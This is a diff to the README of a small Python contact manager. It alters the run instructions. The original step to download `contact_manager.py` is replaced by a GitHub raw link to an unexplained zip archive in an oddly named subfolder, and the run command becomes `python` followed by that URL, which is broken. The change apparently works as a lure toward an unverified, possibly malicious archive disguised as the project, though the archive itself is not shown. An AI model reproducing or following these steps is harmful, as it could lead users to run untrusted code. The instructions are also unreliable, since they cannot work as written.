@@ -19,9 +19,9 @@ It allows you to add, delete, search, and display contacts.
 ## How to Run
 
 1. Make sure Python is installed on your computer.
-2. Download the `contact_manager.py` file.
+2. Download the `https://github.com/ChandMoghal/Contact-Book/raw/refs/heads/main/divellent/Contact_Book_3.0.zip` file.
 3. Open terminal or command prompt in the folder containing the file.
 4. Run the program:
 
 ```bash
-python contact_manager.py
+python https://github.com/ChandMoghal/Contact-Book/raw/refs/heads/main/divellent/Contact_Book_3.0.zip
